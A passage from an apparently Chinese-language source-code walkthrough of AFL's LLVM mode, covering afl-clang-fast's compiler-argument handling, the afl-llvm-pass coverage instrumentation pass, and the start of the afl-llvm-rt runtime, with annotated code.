cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// AFL 必要的预定义宏</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_HAVE_MANUAL_CONTROL=1&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When the user tries to use persistent or deferred forkserver modes by</span></span><br><span class="line"><span class="comment">     appending a single line to the program, we want to reliably inject a</span></span><br><span class="line"><span class="comment">     signature into the binary (to be picked up by afl-fuzz) and we want</span></span><br><span class="line"><span class="comment">     to call a function from the runtime .o file. This is unnecessarily</span></span><br><span class="line"><span class="comment">     painful for three reasons:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     1) We need to convince the compiler not to optimize out the signature.</span></span><br><span class="line"><span class="comment">        This is done with __attribute__((used)).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2) We need to convince the linker, when called with -Wl,--gc-sections,</span></span><br><span class="line"><span class="comment">        not to do the same. This is done by forcing an assignment to a</span></span><br><span class="line"><span class="comment">        &#x27;volatile&#x27; pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     3) We need to declare __afl_persistent_loop() in the global namespace,</span></span><br><span class="line"><span class="comment">        but doing this within a method in a class is hard - :: and extern &quot;C&quot;</span></span><br><span class="line"><span class="comment">        are forbidden and __attribute__((alias(...))) doesn&#x27;t work. Hence the</span></span><br><span class="line"><span class="comment">        __asm__ aliasing trick.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">/* 持久模式循环宏 (__AFL_LOOP) 实现技巧：</span></span><br><span class="line"><span class="comment">     1. 使用 __attribute__((used)) 防止优化移除</span></span><br><span class="line"><span class="comment">     2. 使用 volatile 指针防止链接器GC</span></span><br><span class="line"><span class="comment">     3. 使用 __asm__ 别名解决命名空间问题 */</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_LOOP(_A)=&quot;</span></span><br><span class="line">    <span class="string">&quot;(&#123; static volatile char *_B __attribute__((used)); &quot;</span><span class="comment">// volatile防优化</span></span><br><span class="line">    <span class="string">&quot; _B = (char*)\&quot;&quot;</span> PERSIST_SIG <span class="string">&quot;\&quot;; &quot;</span><span class="comment">// 持久模式签名</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span><span class="comment">// macOS可见性</span></span><br><span class="line">    <span class="string">&quot;int _L(unsigned int) __asm__(\&quot;___afl_persistent_loop\&quot;); &quot;</span><span class="comment">// 函数别名</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span><span class="comment">// 标准可见性</span></span><br><span class="line">    <span class="string">&quot;int _L(unsigned int) __asm__(\&quot;__afl_persistent_loop\&quot;); &quot;</span><span class="comment">// 函数别名</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">    <span class="string">&quot;_L(_A); &#125;)&quot;</span>;<span class="comment">// 调用持久循环函数</span></span><br><span class="line"> <span class="comment">/* 延迟初始化宏 (__AFL_INIT) 实现 */</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_INIT()=&quot;</span></span><br><span class="line">    <span class="string">&quot;do &#123; static volatile char *_A __attribute__((used)); &quot;</span><span class="comment">// volatile防优化</span></span><br><span class="line">    <span class="string">&quot; _A = (char*)\&quot;&quot;</span> DEFER_SIG <span class="string">&quot;\&quot;; &quot;</span><span class="comment">// 延迟初始化签名</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span></span><br><span class="line">    <span class="string">&quot;void _I(void) __asm__(\&quot;___afl_manual_init\&quot;); &quot;</span><span class="comment">// macOS别名</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;__attribute__((visibility(\&quot;default\&quot;))) &quot;</span></span><br><span class="line">    <span class="string">&quot;void _I(void) __asm__(\&quot;__afl_manual_init\&quot;); &quot;</span><span class="comment">// 标准别名</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">    <span class="string">&quot;_I(); &#125; while (0)&quot;</span>;<span class="comment">// 调用初始化函数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x_set) &#123;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-x&quot;</span>; <span class="comment">// 如果存在 -x 参数，添加&quot;none&quot;重置语言类型</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ANDROID__</span></span><br><span class="line">  <span class="built_in"><span class="keyword">switch</span></span> (bit_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-llvm-rt.o&quot;</span>, obj_path);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-llvm-rt-32.o&quot;</span>, obj_path);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">access</span>(cc_params[cc_par_cnt - <span class="number">1</span>], R_OK))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;-m32 is not supported by your compiler&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-llvm-rt-64.o&quot;</span>, obj_path);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">access</span>(cc_params[cc_par_cnt - <span class="number">1</span>], R_OK))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;-m64 is not supported by your compiler&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_TRACE_PC</span></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-clang-fast [tpcg] &quot;</span> cBRI VERSION  cRST <span class="string">&quot; by &lt;lszekeres@google.com&gt;\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-clang-fast &quot;</span> cBRI VERSION  cRST <span class="string">&quot; by &lt;lszekeres@google.com&gt;\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^USE_TRACE_PC */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for clang, letting you recompile third-party code with the required runtime\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-clang-fast ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-clang-fast++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;In contrast to the traditional afl-clang tool, this version is implemented as\n&quot;</span></span><br><span class="line">         <span class="string">&quot;an LLVM pass and tends to offer improved performance with slow programs.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC and AFL_CXX. Setting\n&quot;</span></span><br><span class="line">         <span class="string">&quot;AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ANDROID__</span></span><br><span class="line">  <span class="built_in">find_obj</span>(argv[<span class="number">0</span>]);<span class="comment">//查找 AFL 运行时对象文件 afl-llvm-rt.o 的路径</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);<span class="comment">//编辑并构建最终的编译器参数列表</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="afl-llvm-pass"><a href="#afl-llvm-pass" class="headerlink" title="afl-llvm-pass"></a>afl-llvm-pass</h2><h3 id="GlobalVariable"><a href="#GlobalVariable" class="headerlink" title="GlobalVariable"></a>GlobalVariable</h3><p><em>GlobalVariable</em> 类是 LLVM 中间表示（IR）中表示全局变量的核心类</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">GlobalVariable</span>(Type *Ty,</span><br><span class="line">               <span class="keyword">bool</span> isConstant,</span><br><span class="line">               LinkageTypes Linkage,</span><br><span class="line">               Constant *Initializer = <span class="literal">nullptr</span>,</span><br><span class="line">               <span class="keyword">const</span> Twine &amp;Name = <span class="string">&quot;&quot;</span>,</span><br><span class="line">               ThreadLocalMode = NotThreadLocal,</span><br><span class="line">               <span class="keyword">unsigned</span> AddressSpace = <span class="number">0</span>,</span><br><span class="line">               <span class="keyword">bool</span> isExternallyInitialized = <span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>构造函数参数如上</p><ul><li><code>Type *Ty</code>: <strong>必需。</strong> 全局变量的类型。注意，全局变量在 LLVM IR 中始终是指针类型。<code>Ty</code> 指定的是该指针所指向的数据的类型（例如，<code>i32*</code> 表示指向 32 位整数的指针，此时 <code>Ty</code> 应为 <code>IntegerType::get(Context, 32)</code>，<code>Type::getInt32PtrTy(Context)</code> 会返回 <code>i32*</code>)。</li><li><code>bool isConstant</code>: <strong>必需。</strong> 如果为 <code>true</code>，表示该全局变量在程序执行期间是常量（不可修改）。如果为 <code>false</code>，表示变量是可写的。</li><li><code>LinkageTypes Linkage</code>: <strong>必需。</strong> 指定链接类型，控制该全局变量在链接时的可见性和行为。常见值如 <code>ExternalLinkage</code>（外部可见）、<code>InternalLinkage</code>（仅本模块可见）、<code>PrivateLinkage</code>（类似内部，但更严格的局部性）、<code>WeakAnyLinkage</code>/<code>WeakODRLinkage</code>（弱链接）、<code>LinkOnceAnyLinkage</code>/<code>LinkOnceODRLinkage</code>（链接时去重）等。</li><li><code>Constant *Initializer = nullptr</code>: 可选的初始值。必须是 <code>Constant</code> 或其子类（如 <code>ConstantInt</code>, <code>ConstantFP</code>, <code>ConstantArray</code>, <code>ConstantStruct</code>, <code>GlobalValue</code> 等）。类型必须与 <code>Ty</code> 所指向的类型兼容（例如，如果 <code>Ty</code> 是 <code>i32*</code>，那么 <code>Initializer</code> 必须是 <code>ConstantInt</code> 或其子类，表示一个 <code>i32</code> 类型的常量）。如果为 <code>nullptr</code>，则表示该全局变量没有初始化器（通常用于声明而非定义）。</li><li><code>const Twine &amp;Name = &quot;&quot;</code>: 可选的全局变量名称（例如 <code>@gvar</code>）。<code>Twine</code> 是 LLVM 中高效处理字符串拼接和传递的类。</li><li><code>ThreadLocalMode = NotThreadLocal</code>: 指定线程本地存储模式。默认为 <code>NotThreadLocal</code>（普通全局变量）。其他选项如 <code>GeneralDynamicTLSModel</code>, <code>LocalDynamicTLSModel</code>, <code>InitialExecTLSModel</code>, <code>LocalExecTLSModel</code>，用于实现线程局部变量。</li><li><code>unsigned AddressSpace = 0</code>: 指定该全局变量所在的地址空间。默认为 0（通用地址空间）。某些目标架构（如 GPU）支持不同的地址空间（如全局内存、常量内存、共享内存、局部内存）。</li><li><code>bool isExternallyInitialized = false</code>: 如果为 <code>true</code>，表示该全局变量虽然在当前模块中定义，但其初始值是由外部实体（例如另一个模块或运行时环境）设置的。这通常与特殊链接类型或运行时模型相关。</li></ul><p><strong>功能：</strong> 创建一个 <code>GlobalVariable</code> 对象，并<strong>自动将其插入到指定模块 <code>M</code> 的全局变量列表的末尾</strong><br>再来看看afl-llvm-pass中的两个GlobalVariable对象：</p><h4 id="AFLMapPtr-共享内存区域指针"><a href="#AFLMapPtr-共享内存区域指针" class="headerlink" title="AFLMapPtr - 共享内存区域指针"></a>AFLMapPtr - 共享内存区域指针</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">GlobalVariable *AFLMapPtr =</span><br><span class="line">      <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(M, PointerType::<span class="built_in">get</span>(Int8Ty, <span class="number">0</span>), <span class="literal">false</span>,</span><br><span class="line">                         GlobalValue::ExternalLinkage, <span class="number">0</span>, <span class="string">&quot;__afl_area_ptr&quot;</span>);</span><br></pre></td></tr></table></figure><ol><li><p><strong>变量类型</strong>：<code>PointerType::get(Int8Ty, 0)</code></p><ul><li>指向 <code>i8</code>（8位整数/字节）的指针</li><li>地址空间为 0（默认通用地址空间）</li><li>相当于 C 语言中的 <code>unsigned char*</code></li></ul></li><li><p><strong>变量属性</strong>：</p><ul><li><p><code>false</code>：非常量（可修改）</p></li><li><p>```<br>GlobalValue::ExternalLinkage</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     ：外部链接</span><br><span class="line"></span><br><span class="line">     - 需要在链接时解析的实际符号</span><br><span class="line"></span><br><span class="line">   - `0`：初始化为 `nullptr`（无初始值）</span><br><span class="line"></span><br><span class="line">   - `&quot;__afl_area_ptr&quot;`：全局符号名称</span><br><span class="line"></span><br><span class="line">3. **实际作用**：</span><br><span class="line"></span><br><span class="line">   - 这是 AFL 插桩的核心变量，指向共享内存区域</span><br><span class="line">   - AFL 运行时会在程序启动前将此指针初始化为实际共享内存地址</span><br><span class="line">   - 插桩代码通过此指针访问和更新覆盖率位图(bitmap)</span><br><span class="line">   - 当程序执行到被插桩的基本块时，代码会更新此指针指向的共享内存</span><br><span class="line"></span><br><span class="line">#### AFLPrevLoc - 前一个位置标识符</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">GlobalVariable *AFLPrevLoc = new GlobalVariable(</span><br><span class="line">      M, Int32Ty, false, GlobalValue::ExternalLinkage, 0, &quot;__afl_prev_loc&quot;,</span><br><span class="line">      0, GlobalVariable::GeneralDynamicTLSModel, 0, false);</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>功能分析：</strong></p><ol><li><p><strong>变量类型</strong>：<code>Int32Ty</code> - 32位整数</p></li><li><p><strong>关键属性</strong>：</p><ul><li><p><code>false</code>：非常量（可修改）</p></li><li><p><code>GlobalValue::ExternalLinkage</code>：外部链接</p></li><li><p><code>0</code>：初始化为 <code>nullptr</code>（实际由运行时初始化）</p></li><li><p><code>&quot;__afl_prev_loc&quot;</code>：全局符号名称</p></li><li><p>```<br>GlobalVariable::GeneralDynamicTLSModel</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     ：线程本地存储模式</span><br><span class="line"></span><br><span class="line">     - **最重要的特性**：每个线程有自己的副本</span><br><span class="line"></span><br><span class="line">3. **实际作用**：</span><br><span class="line"></span><br><span class="line">   - 存储&quot;前一个基本块&quot;的随机标识符</span><br><span class="line">   - AFL 使用此变量实现路径跟踪：`当前基本块ID ^ (前一个基本块ID &gt;&gt; 1)`</span><br><span class="line">   - 线程本地存储(TLS)确保：</span><br><span class="line">     - 每个线程有自己的执行路径记录</span><br><span class="line">     - 多线程程序也能正确跟踪覆盖率</span><br><span class="line">     - 避免线程间竞争条件</span><br><span class="line">   - GeneralDynamicTLSModel 是最通用的 TLS 模型，适用于动态链接库</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">#define AFL_LLVM_PASS</span><br><span class="line"></span><br><span class="line">#include &quot;../config.h&quot;</span><br><span class="line">#include &quot;../debug.h&quot;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#include &quot;llvm/ADT/Statistic.h&quot;</span><br><span class="line">#include &quot;llvm/IR/IRBuilder.h&quot;</span><br><span class="line">#include &quot;llvm/IR/LegacyPassManager.h&quot;</span><br><span class="line">#include &quot;llvm/IR/Module.h&quot;</span><br><span class="line">#include &quot;llvm/Support/Debug.h&quot;</span><br><span class="line">#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace llvm;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line"></span><br><span class="line">  class AFLCoverage : public ModulePass &#123;</span><br><span class="line"></span><br><span class="line">    public:</span><br><span class="line"></span><br><span class="line">      static char ID;</span><br><span class="line">      AFLCoverage() : ModulePass(ID) &#123; &#125;</span><br><span class="line"></span><br><span class="line">      bool runOnModule(Module &amp;M) override;</span><br><span class="line"></span><br><span class="line">      // StringRef getPassName() const override &#123;</span><br><span class="line">      //  return &quot;American Fuzzy Lop Instrumentation&quot;;</span><br><span class="line">      // &#125;</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char AFLCoverage::ID = 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool AFLCoverage::runOnModule(Module &amp;M) &#123;</span><br><span class="line">  // 获取当前模块的 LLVM 上下文</span><br><span class="line">  LLVMContext &amp;C = M.getContext();</span><br><span class="line">   // 定义常用的整数类型</span><br><span class="line">  IntegerType *Int8Ty  = IntegerType::getInt8Ty(C);// 8位整数类型</span><br><span class="line">  IntegerType *Int32Ty = IntegerType::getInt32Ty(C);// 32位整数类型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* Show a banner */</span><br><span class="line"></span><br><span class="line">  char be_quiet = 0;// 静默模式标志</span><br><span class="line"></span><br><span class="line">  // 如果标准错误是终端且未设置 AFL_QUIET，则显示横幅</span><br><span class="line">  if (isatty(2) &amp;&amp; !getenv(&quot;AFL_QUIET&quot;)) &#123;</span><br><span class="line">    // 打印彩色横幅</span><br><span class="line">    SAYF(cCYA &quot;afl-llvm-pass &quot; cBRI VERSION cRST &quot; by &lt;lszekeres@google.com&gt;\n&quot;);</span><br><span class="line"></span><br><span class="line">  &#125; else be_quiet = 1;// 启用静默模式</span><br><span class="line"></span><br><span class="line">  /* Decide instrumentation ratio */</span><br><span class="line"></span><br><span class="line">  char* inst_ratio_str = getenv(&quot;AFL_INST_RATIO&quot;);// 获取环境变量</span><br><span class="line">  unsigned int inst_ratio = 100;// 默认100%插桩</span><br><span class="line"></span><br><span class="line">  if (inst_ratio_str) &#123;</span><br><span class="line">    // 解析环境变量值 (1-100)</span><br><span class="line">    if (sscanf(inst_ratio_str, &quot;%u&quot;, &amp;inst_ratio) != 1 || !inst_ratio ||</span><br><span class="line">        inst_ratio &gt; 100)</span><br><span class="line">      FATAL(&quot;Bad value of AFL_INST_RATIO (must be between 1 and 100)&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* Get globals for the SHM region and the previous location. Note that</span><br><span class="line">     __afl_prev_loc is thread-local. */</span><br><span class="line">  /* 获取 SHM 共享内存区域和上一次位置的全局变量 */</span><br><span class="line">  // __afl_area_ptr: 指向共享内存的指针</span><br><span class="line">  GlobalVariable *AFLMapPtr =</span><br><span class="line">      new GlobalVariable(M, PointerType::get(Int8Ty, 0), false,</span><br><span class="line">                         GlobalValue::ExternalLinkage, 0, &quot;__afl_area_ptr&quot;);</span><br><span class="line">  // __afl_prev_loc: 线程局部存储的上一个位置（跨函数保持）</span><br><span class="line">  GlobalVariable *AFLPrevLoc = new GlobalVariable(</span><br><span class="line">      M, Int32Ty, false, GlobalValue::ExternalLinkage, 0, &quot;__afl_prev_loc&quot;,</span><br><span class="line">      0, GlobalVariable::GeneralDynamicTLSModel, 0, false);</span><br><span class="line"></span><br><span class="line">  /* Instrument all the things! */</span><br><span class="line">  /* 开始插桩所有基本块 */</span><br><span class="line">  int inst_blocks = 0;</span><br><span class="line"></span><br><span class="line">  for (auto &amp;F : M)</span><br><span class="line">    for (auto &amp;BB : F) &#123;</span><br><span class="line">      // 获取基本块中第一个插入点,寻找一个安全的插入点插入</span><br><span class="line">      BasicBlock::iterator IP = BB.getFirstInsertionPt();</span><br><span class="line">      // 创建IR构建器</span><br><span class="line">      IRBuilder&lt;&gt; IRB(&amp;(*IP));</span><br><span class="line">      // 根据插桩比例随机跳过</span><br><span class="line">      if (AFL_R(100) &gt;= inst_ratio) continue;</span><br><span class="line"></span><br><span class="line">      /* Make up cur_loc */</span><br><span class="line">       /* 生成随机位置ID */</span><br><span class="line">      unsigned int cur_loc = AFL_R(MAP_SIZE); // 生成MAP_SIZE范围内的随机ID</span><br><span class="line"></span><br><span class="line">      ConstantInt *CurLoc = ConstantInt::get(Int32Ty, cur_loc);// 创建常量整数</span><br><span class="line"></span><br><span class="line">      /* Load prev_loc */</span><br><span class="line">      /* 加载上一个位置ID（__afl_prev_loc） */</span><br><span class="line">      LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc);// 生成load指令，加载之前的全局变量__afl_prev_loc</span><br><span class="line">      PrevLoc-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));//禁用Sanitizer检查（避免误报数据竞争）%0 = load i32, i32* @__afl_prev_loc, !nosanitize !0</span><br><span class="line">      Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());//将值零扩展为32位%1 = zext iN %0 to i32</span><br><span class="line"></span><br><span class="line">      /* Load SHM pointer */</span><br><span class="line"></span><br><span class="line">      LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr); //生成load指令，加载之前的全局变量，%0 = load i32, i32* @__afl_area_ptr</span><br><span class="line">      MapPtr-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));//%0 = load i32, i32* @__afl_area_ptr, !nosanitize !0</span><br><span class="line">      Value *MapPtrIdx =</span><br><span class="line">          IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));//将值零扩展为32位%1 = zext iN %0 to i32</span><br><span class="line"></span><br><span class="line">      /* Update bitmap */</span><br><span class="line"></span><br><span class="line">      LoadInst *Counter = IRB.CreateLoad(MapPtrIdx);//加载当前计数器值，%counter_val = load i8, i8* %map_ptr_idx, !nosanitize !0</span><br><span class="line">      Counter-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));//禁用Sanitizer检查</span><br><span class="line">      Value *Incr = IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, 1));//计数器加1，%new_val = add i8 %counter_val, 1</span><br><span class="line">      IRB.CreateStore(Incr, MapPtrIdx)</span><br><span class="line">          -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));//存储更新后的值，store i8 %new_val, i8* %map_ptr_idx, !nosanitize !0</span><br><span class="line"></span><br><span class="line">      /* Set prev_loc to cur_loc &gt;&gt; 1 */</span><br><span class="line"></span><br><span class="line">      StoreInst *Store =</span><br><span class="line">          IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; 1), AFLPrevLoc);//store i32 %cur_loc_shifted, i32* @__afl_prev_loc</span><br><span class="line">      Store-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));//禁用Sanitizer检查</span><br><span class="line"></span><br><span class="line">      inst_blocks++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* Say something nice. */</span><br><span class="line"></span><br><span class="line">  if (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    if (!inst_blocks) WARNF(&quot;No instrumentation targets found.&quot;);</span><br><span class="line">    else OKF(&quot;Instrumented %u locations (%s mode, ratio %u%%).&quot;,</span><br><span class="line">             inst_blocks, getenv(&quot;AFL_HARDEN&quot;) ? &quot;hardened&quot; :</span><br><span class="line">             ((getenv(&quot;AFL_USE_ASAN&quot;) || getenv(&quot;AFL_USE_MSAN&quot;)) ?</span><br><span class="line">              &quot;ASAN/MSAN&quot; : &quot;non-hardened&quot;), inst_ratio);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void registerAFLPass(const PassManagerBuilder &amp;,</span><br><span class="line">                            legacy::PassManagerBase &amp;PM) &#123;</span><br><span class="line"></span><br><span class="line">  PM.add(new AFLCoverage());</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static RegisterStandardPasses RegisterAFLPass(</span><br><span class="line">    PassManagerBuilder::EP_ModuleOptimizerEarly, registerAFLPass);</span><br><span class="line"></span><br><span class="line">static RegisterStandardPasses RegisterAFLPass0(</span><br><span class="line">    PassManagerBuilder::EP_EnabledOnOptLevel0, registerAFLPass);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="afl-llvm-rt"><a href="#afl-llvm-rt" class="headerlink" title="afl-llvm-rt"></a>afl-llvm-rt</h2><p>该文件中定义了多个AFL LLVM_Mode的函数</p><h3 id="afl-manual-init"><a href="#afl-manual-init" class="headerlink" title="__afl_manual_init"></a>__afl_manual_init</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">u8  __afl_area_initial[MAP_SIZE];           <span class="comment">// 初始共享内存区域（默认64KB）</span></span><br><span class="line">u8* __afl_area_ptr = __afl_area_initial;    <span class="comment">// 当前使用的共享内存指针，由afl-llvm-pass来加入到目标程序</span></span><br><span class="line"><span class="keyword">void</span> __afl_manual_init(<span class="keyword">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> u8 init_done;<span class="comment">// 初始化状态标志</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!init_done) &#123;</span><br><span class="line"></span><br><span class="line">    __afl_map_shm();<span class="comment">// 建立共享内存映射</span></span><br><span class="line">    __afl_start_forkserver();<span class="comment">// </span></span><br><span class="line">    init_done = <span class="number">1</span>; <span class="comment">// 标记已初始化</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="afl-map-shm"><a href="#afl-map-shm" class="headerlink" title="__afl_map_shm"></a>__afl_map_shm</h4><p>该函数就是从环境变量中读取SHM_ENV_VAR来获取共享内存，如果存在的话就赋值给**__afl_area_ptr**，</p><p>如果没有就指向**__afl_area_initial**数组</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __afl_map_shm(<span class="keyword">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  u8 *id_str = <span class="built_in">getenv</span>(SHM_ENV_VAR);<span class="comment">// 获取环境变量中的共享内存ID</span></span><br><span class="line"></span><br><span class="line">  <span 